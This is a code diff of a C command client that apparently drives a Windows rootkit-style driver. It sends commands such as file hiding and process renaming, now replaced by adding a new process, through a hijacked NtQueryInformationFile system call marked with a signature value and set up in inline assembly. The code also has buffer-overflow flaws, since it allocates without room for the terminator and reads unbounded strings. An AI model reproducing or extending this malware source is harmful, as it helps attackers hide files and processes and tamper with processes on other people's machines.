@@ -21,8 +21,7 @@ void SendOK();
 void SendFail();
 int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result);
 void GetTestCommand(const char* to_parse, PCOMMAND cmd);
-void GetRpidCommand(const char* to_parse, PCOMMAND cmd);
-void GetRnameCommand(const char* to_parse, PCOMMAND cmd);
+void GetNewProcCommand(const char* to_parse, PCOMMAND cmd);
 void GethFileCommand(const char* to_parse, PCOMMAND cmd);
 void GetKeyCommand(const char* to_parse, PCOMMAND cmd);
 void GetNetSrcCommand(const char* to_parse, PCOMMAND cmd);
@@ -99,41 +98,14 @@ int main(int argc, char* argv[]) {
 			SysCall();
 		}
 		// RENAME PROCESS PID
-		else if (!strcmp(argv[1], "rpid")) {
+		else if (!strcmp(argv[1], "new_proc")) {
 			if (argc == 4) {
 				len = strlen(argv[3]);
 				cmd.change = malloc(len);
 				strcpy((char*)cmd.change, argv[3]);
 
 				cmd.target = (void*)strtoul(argv[2], NULL, 0);
-				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_NUMBER;
-
-				__asm {
-					push 0
-					push 0
-					push 0
-					lea eax, cmd
-					push eax
-					push SIGNATURE_SYSCALL
-					mov eax, NUMBER_NT_QUERY_INFORMATION_FILE
-				}
-				AddressSystemCall = (unsigned int)FastSystemCall;
-				SysCall();
-			}
-			else printf("Error rename process\n");
-		}
-		// RENAME PROCESS NAME
-		else if (!strcmp(argv[1], "rname")) {
-			if (argc == 4) {
-				len = strlen(argv[2]);
-				cmd.target = malloc(len);
-				strcpy((char*)cmd.target, argv[2]);
-
-				len = strlen(argv[3]);
-				cmd.change = malloc(len);
-				strcpy((char*)cmd.change, argv[3]);
-
-				cmd.flags = COMMAND_RENAME_PROCESS | COMMAND_BUFFER_POINTER;
+				cmd.flags = COMMAND_ADD_NEW_PROCESS | COMMAND_BUFFER_NUMBER;
 
 				__asm {
 					push 0
@@ -375,15 +347,9 @@ int GetCommand(const char* payload_string, PCOMMAND payload, int* has_result) {
 		GetTestCommand(payload_string, payload);
 		goto end_label;
 	}
-	else if (!strcmp(first_command, "rpid")) {
+	else if (!strcmp(first_command, "new_proc")) {
 		payload_string = payload_string + len_of_command + 1;
-		GetRpidCommand(payload_string, payload);
-		goto end_label;
-	}
-	else if (!strcmp(first_command, "rname")) {
-		payload_string = payload_string + len_of_command + 1;
-		GetRnameCommand(payload_string, payload);
-		*has_result = 1;
+		GetNewProcCommand(payload_string, payload);
 		goto end_label;
 	}
 	else if (!strcmp(first_command, "hfile")) {
@@ -424,21 +390,13 @@ void GetTestCommand(const char* to_parse, PCOMMAND cmd) {
 	cmd->flags = COMMAND_TEST_COMMAND;
 }
 
-void GetRpidCommand(const char* to_parse, PCOMMAND cmd) {
+void GetNewProcCommand(const char* to_parse, PCOMMAND cmd) {
 	cmd->change = malloc(100);
 
 	if (isdigit(to_parse[0]) != 0) {
 		sscanf(to_parse, "%d %s", &(unsigned int)cmd->target, (char*)cmd->change);
-		cmd->flags = COMMAND_BUFFER_NUMBER | COMMAND_RENAME_PROCESS;
+		cmd->flags = COMMAND_BUFFER_NUMBER | COMMAND_ADD_NEW_PROCESS;
 	}
-}
-
-void GetRnameCommand(const char* to_parse, PCOMMAND cmd) {
-	cmd->change = malloc(100);
-	cmd->target = malloc(100);
-
-	sscanf(to_parse, "%s %s", (char*)cmd->target, (char*)cmd->change);
-	cmd->flags = COMMAND_BUFFER_POINTER | COMMAND_RENAME_PROCESS;
 }
 
 void GethFileCommand(const char* to_parse, PCOMMAND cmd) {
